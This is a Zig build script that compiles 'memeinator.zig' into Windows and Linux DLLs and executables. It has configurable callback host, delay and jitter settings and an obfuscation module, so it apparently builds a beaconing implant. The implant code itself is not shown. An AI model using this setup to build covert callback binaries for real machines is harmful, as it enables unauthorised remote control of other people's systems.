const std = @import("std");
const builtin = @import("builtin");

const targets: []const std.zig.CrossTarget = &.{
    .{ .cpu_arch = .x86_64, .os_tag = .windows, .abi = .msvc },
    .{ .cpu_arch = .x86_64, .os_tag = .linux, .abi = .gnu },
};

pub fn package(b: *std.Build, exe: *std.Build.Step.Compile, t: std.zig.CrossTarget) !void {
    const target_output = b.addInstallArtifact(exe, .{
        .dest_dir = .{
            .override = .{
                .custom = try t.zigTriple(b.allocator),
            },
        },
    });

    b.getInstallStep().dependOn(&target_output.step);

    return;
}

pub fn build(b: *std.Build) !void {
    const sources = [_][]const u8{
        "memeinator.zig",
    };

    const callback_host = b.option(
        []const u8,
        "callback_host",
        "schema://domainip:port",
    ) orelse "http://127.0.0.1:8080";

    const host_background_path = b.option(
        []const u8,
        "host_background_path",
        "some path on the filesystem",
    ) orelse "test.png";

    const callback_delay = b.option(
        []const u8,
        "callback_delay",
        "callback delay",
    ) orelse "30";

    const callback_jitter = b.option(
        []const u8,
        "callback_jitter",
        "callback jitter",
    ) orelse "30";

    const tool = b.addExecutable(.{
        .name = "generate_config",
        .root_source_file = b.path("tools/generate_config.zig"),
        .target = b.host,
    });

    const tool_step = b.addRunArtifact(tool);
    const output = tool_step.addOutputFileArg("config.zig");

    tool_step.addArg(callback_host);
    tool_step.addArg(host_background_path);
    tool_step.addArg(callback_delay);
    tool_step.addArg(callback_jitter);

    const optimize = b.standardOptimizeOption(.{});

    const obfuscation = b.createModule(.{
        .root_source_file = .{ .src_path = .{ .owner = b, .sub_path = "lib/obfuscation.zig" } },
    });

    const config = b.createModule(.{
        .root_source_file = output,
    });
    config.addImport("obfuscation", obfuscation);

    const zigwin32 = b.createModule(.{
        .root_source_file = .{ .src_path = .{ .owner = b, .sub_path = "zigwin32/win32.zig" } },
    });

    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    for (targets) |t| {
        for (sources) |file| {
            var mode: ?[]const u8 = "release";
            const cpu_arch: ?[]const u8 = "x86_64";
            const abi: ?[]const u8 = switch (t.abi.?) {
                .msvc => "MSVC",
                .gnu => "GNU",
                .musl => "MUSL",
                else => "UNKNOWN",
            };

            if (optimize == std.builtin.OptimizeMode.Debug) {
                mode = "debug";
            }

            const output_file_name = std.fmt.allocPrint(allocator, "{s}-{s}-{s}-{s}", .{ file, abi.?, cpu_arch.?, mode.? }) catch undefined;
            defer allocator.free(output_file_name);

            const dll = b.addSharedLibrary(.{
                .name = output_file_name,
                .root_source_file = b.path(file),
                .target = b.resolveTargetQuery(.{
                    .abi = t.abi,
                    .cpu_arch = t.cpu_arch,
                    .os_tag = t.os_tag,
                }),
                .optimize = optimize,
            });

            dll.root_module.addImport("config", config);
            dll.root_module.addImport("obfuscation", obfuscation);

            if (t.os_tag == .windows) {
                dll.subsystem = .Console;
                dll.root_module.addImport("win32", zigwin32);
            }

            try package(b, dll, t);

            const exe = b.addExecutable(.{
                .name = output_file_name,
                .root_source_file = b.path(file),
                .target = b.resolveTargetQuery(.{
                    .abi = t.abi,
                    .cpu_arch = t.cpu_arch,
                    .os_tag = t.os_tag,
                }),
                .optimize = optimize,
            });

            exe.root_module.addImport("config", config);
            exe.root_module.addImport("obfuscation", obfuscation);

            if (t.os_tag == .windows) {
                exe.subsystem = .Console;
                exe.root_module.addImport("win32", zigwin32);
            }

            try package(b, exe, t);
        }
    }
}
